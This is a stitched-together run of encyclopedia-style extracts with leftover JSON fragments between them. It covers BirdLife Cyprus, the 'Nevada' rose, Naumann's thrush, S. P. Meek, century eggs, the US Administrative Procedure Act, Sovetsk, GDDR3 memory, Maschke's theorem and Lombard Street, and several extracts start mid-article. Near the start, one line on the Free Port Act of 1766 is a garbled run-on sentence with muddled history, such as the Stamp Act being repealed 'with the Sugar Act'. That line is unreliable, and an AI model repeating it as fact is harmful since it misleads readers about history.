The emblem of BLC is the Cyprus wheatear which is an endemic species (it breeds only on the island). History BirdLife Cyprus was formed in 2003 through the merger of two Cyprus Ornithological Societies, and now has offices in Strakka, Nicosia. It is the national partner of BirdLife International, a global partnership of nature conservation organisations working in more than one hundred countries worldwide. BirdLife Cyprus is currently the most active conservation organisation in Cyprus, running campaigns against illegal bird trapping and poaching. Other activities include the designation and protection of Important Bird Areas as Special Protection Areas, as well as campaigns in the area of agriculture, education and awareness-raising. Activities Activities include an ongoing campaign against the illegal bird trapping of wild birds, the protection of Important Bird Areas, the establishment of Special Protection Areas under the European Union's Birds Directive, and the promotion of environmentally friendly agriculture. BirdLife Cyprus campaigns at both local and European levels on behalf of birds and their habitats here in Cyprus, Monitoring and counts: Effective conservation action is impossible without reliable bird population data. As well as producing monthly and annual reports for bird sightings, we have set up and run systematic and scientific monitoring schemes such as monthly counts of wetland birds, a common bird census and surveys of migrating raptors. Habitats: BirdLife Cyprus campaigns to ensure official designation of the scientifically identified Important Bird Areas (IBAs) as Special Protection Areas (SPAs). SPAs form part of the pan- European Natura 2000 network of biodiversity ‚Äòhotspots‚Äô. These SPAs should be managed to ensure proper conservation of the bird species they support and sustainable development of local communities. Illegal bird trapping: BirdLife Cyprus is working to bring an end to illegal bird trapping. Birds trapped on limesticks and in nets die a horrible death and are then sold for profit to be eaten as an expensive so called delicacy, Ambelopoulia. Many migratory and threatened species fall victim to the indiscriminate nets and glue sticks. A recent opinion poll showed that the majority of Cypriots are against this illegal activity. It is estimated that over 2 million birds were killed in 2015 including over 800,000 on the British Territories. Agriculture: The predominantly low-intensity agriculture in Cyprus makes it an attractive place for birds. Agricultural intensification in Europe has had a well-documented and disastrous effect on farmland birds. BirdLife Cyprus promotes a set of practical proposals to ensure local farming practices are kept wildlife- friendly. Education: BirdLife Cyprus also works to raise awareness about the birds of Cyprus and issues that affect them and their habitats. This is done through a combination of articles in the local media and events/talks to introduce people to Cyprus‚Äô birds. Projects: The organisation also implements, or takes part in other programmes, such as the LIfe Oroklini Project for the restoration and management of the Oroklini Lake, the Gypas Project for the recovery of the extremely reduced Cypriot population of griffon vultures, carried out under the Cross-border Cooperation Programme Greece-Cyprus (2007‚Äì2013) and the Darwin Plus project 'Akrotiri Marsh Restoration: a flagship wetland in the Cyprus SBAs' for the restoration of Akrotiri Marsh to a mosaic of habitats, similar to the state it was in some decades ago References External linksBirdLife International *Hellenic Ornithological Society *BirdLife Malta *Game and Fund Service Cyprus *Mediteraves Project Bird conservation organizations BirdLife International Nature conservation in Cyprus Animal welfare organisations based in Cyprus Environmental organizations established in 2003 Ornithological organizations Environmental organisations based in Cyprus 2003 establishments in Cyprus ","title":"BirdLife Cyprus"},{"id":"30875910","text":"The Free Port Act was passed in 1766 also in 1766 the Declaratory Act[Declaratory Act] was passed with the Revenue Act of 1766[Revenue Act of 1766] and more see list of acts of parliament and the Stamp Act was repealed with the Sugar Act.

It is one of his most successful creations and is named for its colour, as nevada is the Spanish word for \\"snowy\\". Its parentage was long under discussion, as Dot introduced the cultivar as a hybrid moyesii, but the cultivar's round, black hips point to its R. pimpinellifolia-parentage. It is probably a cross between Dot's pink hybrid tea 'La Giralda' (introduced in 1926) and the wild rose species Rosa pimpinellifolia var. altaica (synonym R. 'Altaica'), but is sometimes still described as a hybrid moyesii. The single to semi-double flowers have an open bloom form with an average diameter of 4‚Ä≥ to 5‚Ä≥ (10 to 13 cm), and grow on short stems. The ovoid buds have a pink or apricot colour and open to ivory-coloured flowers, which normally quickly fade to white (but can turn pink in hot weather), with golden-yellow stamens. They have a mild, sweet fragrance. The blooming season starts with an abundant first flush in early summer (end of May to mid-June), further flowers appear sparingly throughout the season, with the possibility of a second in autumn. Later flowers are also often tinged pink. The removal of spent blooms helps to encourage re-bloom. In autumn, the rose develops some reddish brown, globular hips with an average diameter of . 'Nevada' forms tall climbing bushes with roundish, light green leaves. The long, arching shoots have a dark chocolate brown colour, few prickles, and are entirely covered with blooms during the first flowering flush. The shrub reaches an average height of 7‚Ä≤ to 13‚Ä≤ (2 to 4 m) and due to its arching habit a width of 8‚Ä≤ to 13‚Ä≤ (2.5 to 4 m), but can grow even higher in warmer climates. 'Nevada' can grow suckers on its own roots. The vigorous cultivar tolerates rain and poorer soils, is very hardy down to ‚àí37 ¬∞C (USDA zone 3b and warmer), and generally disease resistant, but can be susceptible to black spot. 'Nevada' is suitable for plantation in woodland areas or near water, and can be grown as solitaire shrub, in small groups, as hedge, or trained as a climber. Peter Beales calls 'Nevada' one of the best-known semi-double shrub roses. In 1993, the rose cultivar was granted the Award of Garden Merit by the Royal Horticultural Society, but the award was retracted with the reformation of the RHS Award of Garden Merit criteria in 2012/13. sport 'Marguerite Hilling', introduced by Thomas Hilling in 1959 'Marguerite Hilling', also called 'Pink Nevada' is a sport of 'Nevada' discovered by Thomas Hilling (United Kingdom) in the 1950s, that strongly resembles its parent in everything but its colour.

It is closely related to the more northerly breeding dusky thrush T. eunomus; the two have often been regarded as conspecific. This species breeds in open woodland areas; dusky thrush, as would be expected, is more tolerant of mountainous and tundra-edge habitats. This species is strongly migratory, wintering South Asia to Southeast Asia, principally in China, Korea and neighboring countries. It is a rare vagrant to Western Europe. It nests in trees, laying 3-5 eggs in an untidy but neatly lined nest. Migrating birds and wintering birds often form small flocks. It is omnivorous, eating a wide range of insects, especially mosquitoes, earthworms and berries. This is a medium- sized but stocky thrush, reminiscent in structure of a small fieldfare. The underwing is reddish brown, and there is a pale supercilium. Naumann's thrush has pale brown back and head. The face, breast, flank spots and rump are reddish, and the belly and undertail are white, whereas dusky thrush has a darker brown back and rump, and the face, breast, and flank spots rump are black. The belly and undertail are white. The female is fairly similar to the male, but immatures have a weaker patterning. The song of Naumann's thrush may differ from the simple fluted or whistling redwing-like song of dusky thrush.

He published much of his work first as Capt. S.P. Meek, then, briefly, as Major S.P. Meek and, after 1933, as Col. S. P. Meek. He also published one story as Sterner St. Paul. Biography Meek received his associate degree from University of Chicago in 1914 and his bachelor's degree in Metallurgical Engineering from University of Alabama in 1915. He continued his education at University of Wisconsin‚ÄìMadison (1916) and MIT (1921‚Äì1923). He married in 1927 and had one son. When the United States entered World War I in 1917, Meek joined the military as a chemist and ordnance expert. He served as Chief, Small Arms Ammunition Research, in 1923-1926, and Chief Publications Officer, Ordnance Dept., in 1941-1945. He retired a colonel in 1947, at which point he became a full-time writer. Meek's \\"The Red Peril\\" was the cover story in the September 1929 issue of Amazing Stories Writing career Meek sold his first fiction story, \\"Taming Poachers\\", to Field and Stream, where it appeared in September 1928. Between early 1929 and January 1933, he published over 20 science fiction stories and short novels in pulp science fiction magazines like Astounding Science Fiction and Amazing Stories, most of them in his popular Dr. Bird and Operative Carnes series. Meek left the field in early 1933, with only one further science fiction story published in 1939. Like many early pulp science fiction writers, Meek used fiction to give detailed descriptions of current and projected scientific advances. He utilized many contemporary science fiction tropes, e.g. the notion that atoms were miniaturized solar systems in his stories \\"Submicroscopic\\" and \\"Awlo of Ulm\\".See Tony Hey and Patrick Walters. The New Quantum Universe, Cambridge University Press, 2003, p.286 Meek quickly became popular with pulp magazine readers and was eagerly sought out by editors. In the first issue of Astounding Science Fiction in 1930, its editor Harry Bates listed Meek among \\"some of the finest writers of fantasy in the world\\", alongside Murray Leinster, Ray Cummings and others.Quoted in Gary Westfahl. The Mechanics of Wonder: The Creation of the Idea of Science Fiction, Liverpool University Press, Liverpool, 1998, p.168 However, Meek's stories were crudely executed and the higher standards introduced with the Golden Age of Science Fiction soon made them of strictly historical interest. Science fiction writer and critic Samuel R. Delany later called Meek's writing \\"unbelievably bad\\".See Samuel R. Delany. Silent Interviews: On Language, Race, Sex, Science Fiction, and Some Comics, Hanover, New Hampshire, Wesleyan University Press, 1994, p.26 After Meek stopped writing science fiction, his disappearance from the industry was a mystery to readers until The Drums of Tapajos was reprinted in 1962. Meek published over twenty children's books between 1932 and 1956, starting with Jerry, the Adventures of an Army Dog, usually about dogs or horses.

Through the process, the yolk becomes a dark green to grey color, with a creamy consistency and strong flavor due to the hydrogen sulfide and ammonia present, while the white becomes a dark brown, translucent jelly with a salty flavor. The transforming agent in the century egg is an alkaline salt, which gradually raises the pH of the egg to around 9‚Äì12, during the curing process. This chemical process breaks down some of the complex, flavorless proteins and fats, which produces a variety of smaller flavorful compounds. Some eggs have patterns near the surface of the egg white which are likened to pine branches, giving rise to one of its Chinese names, the pine-patterned egg. History The method for creating century eggs likely came about through the need to preserve eggs in times of plenty by coating them in alkaline clay, which is similar to methods of egg preservation in some Western cultures. The clay hardens around the egg and results in the curing and creation of century eggs instead of spoiled eggs. The century egg has at least four centuries of history behind its production. Its discovery, though not verifiable, was said to have occurred around 600 years ago in Hunan during the Ming Dynasty, when a homeowner discovered duck eggs in a shallow pool of slaked lime that was used for mortar during construction of his home two months before. Upon tasting the eggs, he set out to produce more ‚Äì this time with the addition of salt to improve their flavor ‚Äì resulting in the present recipe of the century egg. An alternate story involves a young duck farmer by the name of Shuige (Ê∞¥Âì•, lit. water-brother), also from Hunan, leaving duck eggs in the garden of a woman by the name of Songmei (ÊùæÂ¶π, lit. pine-sister) as a courting gesture. The eggs were not discovered until the woman cleaned out the ash pit half a month later where they had turned into century eggs. In her honour, the farmer named the transformed eggs with their delicate crystalline patterns on their surfaces \\"pine-patterned eggs\\". Methods =Traditional= The traditional method for producing century eggs developed through improvement of the aforementioned primitive process. Instead of using just clay, a mixture of wood ash, calcium oxide, and salt is included in the plastering mixture, thereby increasing its pH and sodium content. The addition of calcium oxide and wood ash to the mixture lowers the risk of spoilage and also increases the speed of the process. A recipe for creating century eggs starts with the infusion of of tea in boiling water. To the tea, of calcium oxide (, if done in winter), of sea salt, and of ash from burned oak is mixed into a smooth paste. Each egg is individually covered by hand, with gloves worn to protect the skin from chemical burns. It is then rolled in a mass of rice chaff, to keep the eggs from adhering to one another, before the eggs are placed in cloth-covered jars or tightly woven baskets. The mud slowly dries and hardens into a crust over several months. The eggs are then ready for consumption. =Modern= Even though the traditional method is still widely practiced, modern understanding of the chemistry behind the formation of century eggs has led to many simplifications in the recipe. Today, soaking raw eggs in a solution of table salt, calcium hydroxide and sodium carbonate for 10 days, followed by several weeks of aging while wrapped in plastic, is said to achieve the same effect as the traditional method. This is because the chemical reaction needed to produce century eggs is accomplished by introducing hydroxide and sodium ions into the egg, regardless of the method used. The extremely toxic compound lead(II) oxide speeds up the reactions which create century eggs, leading to its use by some unscrupulous producers, whereas zinc oxide is now the recommended alternative. Although zinc is essential for life, excessive zinc consumption can lead to copper deficiency, and the finished product should have its zinc level assessed for safety. Uses Century eggs can be eaten without further preparation other than peeling and rinsing them ‚Äì on their own, or as a side dish. As an hors d'≈ìuvre, the Cantonese wrap chunks of this egg with slices of pickled ginger root (sometimes sold on a stick as street food). A Shanghainese recipe mixes chopped century eggs with chilled tofu. In Taiwan, it is popular to eat sliced century eggs placed on top of cold tofu with katsuobushi, soy sauce, and sesame oil, in a style similar to Japanese hiyayakko. A variation of this recipe common in northern China is to slice century eggs over chilled silken (soft) tofu, adding liberal quantities of shredded young ginger and chopped spring onions as a topping, and then drizzling light soy sauce and sesame oil over the dish, to taste. They are also used in a dish called old-and-fresh eggs, where chopped century eggs are combined with (or used to top) an omelette made with fresh eggs. The century eggs may also be cut into chunks and stir fried with vegetables, which is most commonly found in Taiwanese cuisine. Some Chinese households cut them up into small chunks and cook them with rice porridge to create \\"century egg and lean pork congee\\" (). This is sometimes served in dim sum restaurants. Rice congee, lean pork, and century egg are the main ingredients. Peeled century eggs are cut into quarters or eighths and simmered with the seasoned marinated lean slivers of pork until both ingredients are cooked into the rice congee. Fried dough sticks known as youtiao are commonly eaten with century egg congee. Another common variation of this dish is the addition of salted duck eggs into the congee mixture. At special events like wedding banquets or birthday parties, a first course platter of sliced barbecued pork, pickled baby leeks, sliced abalone, pickled julienned carrots, pickled julienned daikon radish, seasoned julienned jellyfish, sliced pork, head cheese and the quartered century eggs is served. This is called a lahng-poon in Cantonese, which simply means \\"cold dish\\". Misconception and etymology Century eggs are sometimes avoided due to the belief that they are prepared by soaking eggs in horse- urine, but there is no good evidence to support this, and furthermore urine is generally not alkaline.Helmenstine, Anne Marie. \\"Are Century Eggs Soaked in Horse Urine?\\" About.com. Thursday 16 October 2008. Retrieved on 20 October 2009. In Thai and Lao, the common word for century egg translates to \\"horse- urine egg\\", due to the distinctive urine-like odor of the delicacy: * (RTGS: khai yiao ma) * Safety Heavy metals have been used to speed up the process to turn more profit for less time and artificially increase the quality of the preserved egg. It was an unscrupulous practice in some small factories but it became rampant in China and forced many honest manufacturers to label their boxes \\"Lead Free\\" after the scandal went mainstream in 2013. Thirty factories in Nanchang county were found to be using industrial quality copper sulphate which was contaminated with arsenic, lead, cadmium, and other heavy metals and toxic chemicals to make eggs more translucent, lessen odor, provide smoother texture and encourage faster curing. The Chinese government has over the years been trying to regulate food additives and license law abiding establishments to combat the food safety incidents in China posed by bad manufacturing practice.

The APA applies to both the federal executive departments and the independent agencies. U.S. Senator Pat McCarran called the APA \\"a bill of rights for the hundreds of thousands of Americans whose affairs are controlled or regulated\\" by federal government agencies. The text of the APA can be found under Title 5 of the United States Code, beginning at Section 500. There is a similar Model State Administrative Procedure Act (Model State APA), which was drafted by the National Conference of Commissioners on Uniform State Laws for oversight of state agencies. Not all states have adopted the model law wholesale, as of 2017. The federal APA does not require systematic oversight of regulations prior to adoption, unlike the Model APA.(2007). OVERSIGHT AND INSIGHT: LEGISLATIVE REVIEW OF AGENCIES AND LESSONS FROM THE STATES . Harvard Law Review. Each US state has passed its own version of the Administrative Procedure Act. Historical background Beginning in 1933, President Franklin D. Roosevelt and the Democratic Congress enacted several statutes that created new federal agencies as part of the New Deal legislative plan, established to guide the United States through the social and economic hardship caused by the Great Depression. However, the Congress became concerned about the expanding powers that these autonomous federal agencies now possessed, resulting in the enactment of the APA to regulate, standardize and oversee these federal agencies. The APA was born in a contentious political environment.Shepard, George. Fierce Compromise: The Administrative Procedure Act Emerges from New Deal Politics. 90 Nw. U. L. Rev. 1557 (1996) Professor George Shepard claims that Roosevelt‚Äôs opponents and supporters fought over passage of the APA \\"in a pitched political battle for the life of the New Deal\\" itself.Shepard, George. Fierce Compromise: The Administrative Procedure Act Emerges from New Deal Politics. 90 Nw. U. L. Rev. 1562 (1996) Shepard notes, however, that a legislative balance was struck with the APA, expressing \\"the nation's decision to permit extensive government, but to avoid dictatorship and central planning.\\"Shepard, George. Fierce Compromise: The Administrative Procedure Act Emerges from New Deal Politics. 90 Nw. U. L. Rev. (1996) A 1946 House of Representatives report discusses the 10-year period of \\"painstaking and detailed study and drafting\\" that went into the APA.Administrative Procedure Act, Report of the House Judiciary Committee, No. 1989, 79th Congress, 1946. Because of rapid growth in the administrative regulation of private conduct, Roosevelt ordered several studies of administrative methods and conduct during the early part of his four-term presidency. Based on one study, Roosevelt commented that the practice of creating administrative agencies with the authority to perform both legislative and judicial work \\"threatens to develop a fourth branch of government for which there is no sanction in the Constitution.\\" In 1939, Roosevelt requested for Attorney General Frank Murphy to form a committee to investigate practices and procedures in American administrative law and suggest improvements. That committee's report, the Final Report of Attorney General's Committee on Administrative Procedure, contained detailed information about the development and procedures of the federal agencies.Final Report of Attorney General's Committee on Administrative Procedure (Senate Document No. 8, 77th Congress, First Session, 1941) The Final Report defined a federal agency as a governmental unit with \\"the power to determine... private rights and obligations\\" by rulemaking or adjudication. The report applied that definition to the largest units of the federal government, and identified \\"nine executive departments and eighteen independent agencies.\\" Overall, 51 federal agencies were identified in the report after including various subdivisions within the larger units. In reviewing the history of federal agencies, the Final Report noted that almost all agencies had undergone changes in name and political function. Of the 51 federal agencies discussed in the Final Report, 11 were created by statute before the American Civil War. From 1865 to 1900, six new agencies were created, notably the Interstate Commerce Commission in 1887 in response to widespread criticism of the railroad industry. From 1900 to 1930, seventeen agencies were created by statute, and eighteen more had been created since. The Final Report made several recommendations about standardizing administrative procedures, but Congress delayed action as the US entered World War II. Since 2005, the House Judiciary Committee has been undertaking an Administrative Law, Process and Procedure Project to consider changes to the Administrative Procedure Act. Basic purposes Although each US government agency is constituted within one branch of the government (judicial, legislative, or executive), an agency's authority often extends into the functions of other branches. Without careful regulation, that can lead to unchecked authority in a particular area of government, violating the separation of powers, a concern that Roosevelt himself acknowledged. To provide constitutional safeguards, the APA creates a framework for regulating agencies and their roles. According to the Attorney General's Manual on the Administrative Procedure Act, drafted after the 1946 enactment of the APA, the basic purposes of the APA are the following: #to require agencies to keep the public informed of their organization, procedures and rules; #to provide for public participation in the rulemaking process, for instance through public commenting; #to establish uniform standards for the conduct of formal rulemaking and adjudication; #to define the scope of judicial review. The APA's provisions apply to many federal governmental institutions and agencies.' The APA in 5 U.S.C. 551(1) defines an \\"agency\\" as \\"each authority of the Government of the United States, whether or not it is within or subject to review by another agency,\\" with the exception of several enumerated authorities, including Congress, federal courts, and governments of territories or possessions of the United States. Courts have also held that the U.S. President is not an agency under the APA. Franklin v. Mass., 505 U.S. 788 (1992). The APA's to hold accountable regulatory business monitors that oversee civil matters that apply \\"'soft' administrative law\\" are also limited.' The Final Report organized federal administrative action into two parts: adjudication and rulemaking. Agency adjudication was broken down further into two distinct phases of formal and informal adjudication. Formal adjudication involve a trial-like hearing with witness testimony, a written record, and a final decision. Under informal adjudication, agency decisions are made without these formal procedures, instead using \\"inspections, conferences and negotiations.\\" Because formal adjudication produces a record of proceedings and a final decision, it may be subject to judicial review. As for rulemaking resulting in agency rules and regulations, the Final Report noted that many agencies provided due process through hearings and investigations, but there was still a need for well-defined uniform standards for agency adjudication and rulemaking procedures. Standard of judicial review The APA requires that to set aside agency actions that are not subject to formal trial-like procedures, the court must conclude that the regulation is \\"arbitrary and capricious, an abuse of discretion, or otherwise not in accordance with the law.\\" However, Congress may further limit the scope of judicial review of agency actions by including such language in the organic statute. To set aside formal rulemaking or formal adjudication for which procedures are trial-like, a different standard of review allows courts to question agency actions more strongly. For such more formal actions, agency decisions must be supported by \\"substantial evidence\\" after the court reads the \\"whole record,\\" which can be thousands of pages long. Unlike arbitrary and capricious review, substantial evidence review gives the courts leeway to consider whether an agency's factual and policy determinations were warranted in light of all the information before the agency at the time of decision. Accordingly, arbitrary and capricious review is understood to be more deferential to agencies than substantial evidence review is. Arbitrary and capricious review allows agency decisions to stand as long as an agency can give a reasonable explanation for its decision based on the information that it had at the time. In contrast, the courts tend to look much harder at decisions resulting from trial-like procedures because they resemble actual trial-court procedures, but Article III of the Constitution reserves the judicial powers for actual courts. Accordingly, courts are strict under the substantial evidence standard when agencies acts like courts because being strict gives courts the final say, preventing agencies from using too much judicial power in violation of separation of powers. The separation of powers doctrine is less of an issue with rulemaking that is not subject to trial-like procedures. Such rulemaking gives agencies more leeway in court because it is similar to the legislative process reserved for Congress. The courts' main role is then to ensure that agency rules conform to the Constitution and the agency's statutory powers. Even if a court finds a rule unwise, it will stand as long as it is not \\"arbitrary, capricious, an abuse of discretion, or otherwise not in accordance with the law.\\" Publication of regulations Rules and regulations issued or proposed (see Notice of Proposed Rulemaking below) by federal administrative agencies are published chronologically in the Federal Register. Promulgated rules and regulations are then organized by topic in a separate publication called the Code of Federal Regulations.

Geography Sovetsk lies at the confluence of the Tilse and Neman rivers. History Napoleon, Alexander I, Queen Louise, and Frederick William III in Tilsit Tilsit, which received civic rights from Albert, Duke of Prussia in 1552, developed around a castle of the Teutonic Knights, known as the Schalauer Haus, founded in 1288. The Treaties of Tilsit were signed here in July 1807, the preliminaries of which were settled by the emperors Alexander I of Russia and Napoleon I of France on a raft moored in the Neman River. This treaty, which created the Kingdom of Westphalia and the Duchy of Warsaw, completed Napoleon's humiliation of the Kingdom of Prussia, when it was deprived of one half of its dominions. This short-lived peace-treaty is also remarkable for quite another reason. Three days before its signing, Prussian queen Louise (1776‚Äì1810) tried to persuade Napoleon in a private conversation to ease his hard conditions on Prussia. Though unsuccessful, Louise's effort greatly endeared her to the Prussian people. Until 1945, a marble tablet marked the house in which King Frederick William III of Prussia and Queen Louise resided. Also, in the former Schenkendorf Platz was a monument to the poet Max von Schenkendorf (1783‚Äì1817), a native of Tilsit. During the 19th century when the Lithuanian language in Latin characters was banned within the Russian Empire, Tilsit was an important centre for printing Lithuanian books which then were smuggled by Knygne≈°iai to the Russian-controlled part of Lithuania. In general, Tilsit thrived and was an important Prussian town. By 1900 it had electric tramways and 34,500 inhabitants; a direct railway line linked it to K√∂nigsberg and Labiau and steamers docked there daily. It was occupied by Russian troops between 26 August 1914 and 12 September 1914 during World War I. The Act of Tilsit was signed here by leaders of the Lietuvininks in 1918. Hitler visited the town just before World War II, and a photo was taken of him on the famous bridge over the Memel River. Tilsit was occupied by the Red Army on January 20, 1945, and was annexed by the Soviet Union in 1945. The remaining Germans who had not evacuated were subsequently forcibly expelled and replaced with Soviet citizens. The town was renamed Sovetsk in honor of Soviet rule. Modern Sovetsk has sought to take advantage of Tilsit's rich traditions of cheese production (Tilsit cheese), but the new name (\\"Sovetsky cheese\\") has not inherited its predecessor's reputation. Since the dissolution of the Soviet Union in 1991, there has been some discussion about the possibility of restoring the town's original name, given its significance in Russian history. In 2010, the Kaliningrad Oblast's then-governor Georgy Boos of the ruling United Russia Party proposed restoring the original name and combining the town with the Nemen and Slavsk Districts to form a new Tilsit District. Boos emphasized that this move would stimulate development and economic growth, but that it could happen only through a referendum. The idea was opposed by the Communist Party of Russia. In particular, Igor Revin, the Kaliningrad Secretary of the Communist Party, accused Boos and United Russia of Germanophilia. In April 2007, government restrictions on visits to border areas have been tightened, and for foreigners, and Russians living outside the border zone, travel to the Sovetsk and Bagrationovsk areas required advance permission from the Border Guard Service (in some cases up to 30 days beforehand). It was alleged that this procedure slowed the development of these potentially thriving border towns.PONARS Eurasia Memo #16. In June 2012, these restrictions were lifted (the only restricted area is the Neman river shoreline), which gave a boost to local and international tourism. Administrative and municipal status Within the framework of administrative divisions, it is incorporated as the town of oblast significance of Sovetsk‚Äîan administrative unit with the status equal to that of the districts.Resolution #639 As a municipal division, the town of oblast significance of Sovetsk is incorporated as Sovetsky Urban Okrug.Law #376 Architecture Many of the town's buildings were destroyed during World War II. However, the old town centre still includes several German buildings, including those of Jugendstil design.

Its specification was developed by ATI Technologies in collaboration with DRAM vendors including Elpida Memory, Hynix Semiconductor, Infineon (later Qimonda) and Micron. It was later adopted as a JEDEC standard.  Overview  It has much the same technological base as DDR2, but the power and heat dispersal requirements have been reduced somewhat, allowing for higher performance memory modules, and simplified cooling systems. GDDR3 is not related to the JEDEC DDR3 specification. This memory uses internal terminators, enabling it to better handle certain graphics demands. To improve throughput, GDDR3 memory transfers 4 bits of data per pin in 2 clock cycles. The GDDR3 interface transfers two 32 bit wide data words per clock cycle from the I/O pins. Corresponding to the 4n-prefetch a single write or read access consists of a 128 bit wide, one- clock-cycle data transfer at the internal memory core and four corresponding 32 bit wide, one-half-clock-cycle data transfers at the I/O Pins. Single-ended unidirectional Read and Write Data strobes are transmitted simultaneously with Read and Write data respectively in order to capture data properly at the receivers of both the Graphics SDRAM and the controller. Data strobes are organized per byte of the 32 bit wide interface. Commercial implementation Despite being designed by ATI, the first card to use the technology was nVidia's GeForce FX 5700 Ultra in early 2004, where it replaced the GDDR2 chips used up to that time. The next card to use GDDR3 was nVidia's GeForce 6800 Ultra, where it was key in maintaining reasonable power requirements compared to the card's predecessor, the GeForce 5950 Ultra. ATI began using the memory on its Radeon X800 cards. GDDR3 was Sony's choice for the PlayStation 3 gaming console's graphics memory, although its nVidia based GPU is also capable of accessing the main system memory, which consists of XDR DRAM designed by Rambus Incorporated (Similar technology is marketed by nVidia as TurboCache in PC platform GPUs). Microsoft's Xbox 360 has 512 MB of GDDR3 memory. Nintendo's Wii also contains 64 MB of GDDR3 memory. Advantages of GDDR3 over DDR2 GDDR3's strobe signal unlike DDR2 SDRAM is unidirectional & single-ended (RDQS, WDQS). This means there is a separate read and write data strobe allowing for a quicker read to write ratio than DDR2. * GDDR3 has a hardware reset capability allowing it to flush all data from memory and then start again. * Lower voltage requirements leads to lower power requirements, and lower heat output. * Higher clock frequencies, due to lower heat output, this is beneficial for increased throughput and more precise timings.

Maschke's theorem allows one to make general conclusions about representations of a finite group G without actually computing them. It reduces the task of classifying all representations to a more manageable task of classifying irreducible representations, since when the theorem applies, any representation is a direct sum of irreducible pieces (constituents). Moreover, it follows from the Jordan‚ÄìH√∂lder theorem that, while the decomposition into a direct sum of irreducible subrepresentations may not be unique, the irreducible pieces have well-defined multiplicities. In particular, a representation of a finite group over a field of characteristic zero is determined up to isomorphism by its character.  Formulations  Maschke's theorem addresses the question: when is a general (finite-dimensional) representation built from irreducible subrepresentations using the direct sum operation? This question (and its answer) are formulated differently for different perspectives on group representation theory. = Group-theoretic = Maschke's theorem is commonly formulated as a corollary to the following result: :Theorem. If is a complex representation of a finite group with a subrepresentation , then there is another subrepresentation of such that =‚äï. Then the corollary is :Corollary (Maschke's theorem). Every representation of a finite group over a field with characteristic not dividing the order of is a direct sum of irreducible representations. The vector space of complex-valued class functions of a group has a natural -invariant inner product structure, described in the article Schur orthogonality relations. Maschke's theorem was originally proved for the case of representations over \\\\mathbb{C} by constructing as the orthogonal complement of under this inner product. = Module-theoretic = One of the approaches to representations of finite groups is through module theory. Representations of a group G are replaced by modules over its group algebra K[G] (to be precise, there is an isomorphism of categories between K[G]-Mod and RepG, the category of representations of G). Irreducible representations correspond to simple modules. In the module-theoretic language, Maschke's theorem asks: is an arbitrary module semisimple? In this context, the theorem can be reformulated as follows: :Maschke's Theorem. Let G be a finite group and K a field whose characteristic does not divide the order of G. Then K[G], the group algebra of G, is semisimple.It follows that every module over K[G] is a semisimple module.The converse statement also holds: if the characteristic of the field divides the order of the group (the modular case), then the group algebra is not semisimple. The importance of this result stems from the well developed theory of semisimple rings, in particular, the Artin‚ÄìWedderburn theorem (sometimes referred to as Wedderburn's Structure Theorem). When K is the field of complex numbers, this shows that the algebra K[G] is a product of several copies of complex matrix algebras, one for each irreducible representation.The number of the summands can be computed, and turns out to be equal to the number of the conjugacy classes of the group. If the field K has characteristic zero, but is not algebraically closed, for example, K is a field of real or rational numbers, then a somewhat more complicated statement holds: the group algebra K[G] is a product of matrix algebras over division rings over K. The summands correspond to irreducible representations of G over K.One must be careful, since a representation may decompose differently over different fields: a representation may be irreducible over the real numbers but not over the complex numbers. = Category-theoretic = Reformulated in the language of semi-simple categories, Maschke's theorem states :Maschke's theorem. If is a group and is a field with characteristic not dividing the order of , then the category of representations of over is semi-simple.  Proofs  = Module-theoretic = Let V be a K[G]-submodule. We will prove that V is a direct summand. Let œÄ be any K-linear projection of K[G] onto V. Consider the map : \\\\begin{cases} \\\\phi:K[G]\\\\to V \\\\\\\\\\\\ \\\\phi(x)=\\\\frac{1}{\\\\\\\\#G}\\\\sum_{s \\\\in G} s\\\\cdot \\\\pi(s^{-1} \\\\cdot x) \\\\end{cases} Then œÜ is again a projection: it is clearly K-linear, maps K[G] onto V, and induces the identity on V. Moreover we have :\\\\begin{align} \\\\phi(t\\\\cdot x) &= \\\\frac{1}{\\\\\\\\#G}\\\\sum_{s \\\\in G} s\\\\cdot \\\\pi(s^{-1}\\\\cdot t\\\\cdot x)\\\\\\\\\\\\ &= \\\\frac{1}{\\\\\\\\#G}\\\\sum_{u \\\\in G} t\\\\cdot u\\\\cdot \\\\pi(u^{-1}\\\\cdot x)\\\\\\\\\\\\ &= t\\\\cdot\\\\phi(x), \\\\end{align} so œÜ is in fact K[G]-linear. By the splitting lemma, K[G]=V \\\\oplus \\\\ker \\\\phi. This proves that every submodule is a direct summand, that is, K[G] is semisimple.  Converse statement  The above proof depends on the fact that #G is invertible in K. This might lead one to ask if the converse of Maschke's theorem also holds: if the characteristic of K divides the order of G, does it follow that K[G] is not semisimple? The answer is yes. Proof. For x=\\\\sum\\\\lambda_g g\\\\in K[G] define \\\\epsilon(x)=\\\\sum\\\\lambda_g. Let I=\\\\ker\\\\epsilon. Then I is a K[G]-submodule. We will prove that for every nontrivial submodule V of K[G], I\\\\cap V eq0. Let V be given, and let v=\\\\sum\\\\mu_gg be any nonzero element of V. If \\\\epsilon(v)=0, the claim is immediate. Otherwise, let s=\\\\sum1g. Then \\\\epsilon(s)=\\\\\\\\#G\\\\cdot1=0 so s\\\\in I and :sv=\\\\left(\\\\sum1g\\\\right)\\\\left(\\\\sum\\\\mu_gg\\\\right)=\\\\sum\\\\epsilon(v)g=\\\\epsilon(v)s so that sv is a nonzero element of both I and V. This proves V is not a direct complement of I for all V, so K[G] is not semisimple.

From Bank junction, where nine streets converge by the Bank of England, Lombard Street runs southeast for a short distance before bearing left into a more easterly direction, and terminates at a junction with Gracechurch Street and Fenchurch Street. Its overall length is . It has often been compared with Wall Street in New York City. Description Lombard Street, since the construction of King William Street, has two distinct sections. The short section between Bank junction and the church of St Mary Woolnoth is relatively wide, and carries two-way traffic including several bus routes, which continues along King William Street. Lombard Street bears to the east and the remainder is much narrower (retaining its medieval character) and is one-way. At the eastern end of the street, there are a number of modern buildings on both sides, in contrast to the older buildings and architectural styles along much of its length. Built in 1990‚Äì92, the former headquarters of Barclays covers a large plot on the north corner of Lombard and Gracechurch streets, and is the largest and tallest building in the immediate vicinity of Lombard Street, at high.Skyscrapernews.com 54 Lombard Street Addresses on the street are numbered 1 to 40 along the south side, running from Bank to Gracechurch Street, then 41 to 82 along the north side, from Gracechurch Street to Bank. The postcodes for the street start with EC3V. The nearest London Underground stations to Lombard Street are Bank and Monument; one of the numerous entrances to Bank station is on Lombard Street itself. Mainline railway stations at Cannon Street and Fenchurch Street are also close by. The street runs downhill towards Bank, being on the eastern side of the Walbrook valley. At its junction with Gracechurch Street it is at an elevation of , whilst at its junction at Bank it is at . Side streets and alleys run towards Cornhill to the north, and 